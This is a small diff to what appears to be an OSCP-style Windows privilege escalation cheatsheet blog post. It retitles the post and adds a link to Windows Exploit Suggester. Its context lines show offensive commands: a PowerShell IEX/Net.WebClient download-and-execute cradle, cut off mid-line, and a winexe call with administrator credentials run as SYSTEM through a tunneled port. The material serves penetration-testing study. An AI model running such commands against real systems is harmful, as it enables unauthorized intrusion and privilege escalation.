@@ -1,10 +1,10 @@
 ---
-title: Windows Post Exploitation
+title: Windows Privilege Escalation
 date: 2020-06-26 18:05:42
 tags: [oscp, cheatsheet, windows, privilege escalation]
 ---
 
-# Total Windows Post Exploitation
+# Windows Privilege Escalation Cheatsheet
 
 So you got a shell, what *now*?
 This post will help you with local enumeration as well as escalate your privileges further.
@@ -203,7 +203,10 @@ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient
 # On KALI
 winexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT 
 mysql --host=127.0.0.1 --port=KALI_PORT -u username -p
-
+```
+## Exploit suggester
+Windows exploit suggester can be found [here](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+``` powershell
 # On KALI
 # Find exploits
 # .\windows-exploit-suggester.py --update
